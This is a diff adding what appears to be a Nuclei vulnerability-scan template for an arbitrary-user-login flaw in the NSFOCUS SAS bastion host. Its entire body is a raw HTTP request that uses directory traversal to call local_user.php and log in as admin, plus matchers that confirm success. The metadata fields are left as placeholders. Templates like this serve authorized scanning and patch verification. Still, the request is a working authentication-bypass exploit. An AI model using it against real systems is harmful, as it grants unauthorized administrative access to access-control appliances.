@@ -1,0 +1,32 @@
+id: NSFOCUS-local_user_UserLogin
+
+info:
+  name: 绿盟SAS堡垒机-local_user-任意用户登录漏洞
+  author: candada
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |+
+        GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: multipart/form-data;multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
+        
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"status":200}'
+      - type: status
+        status:
+          - 200
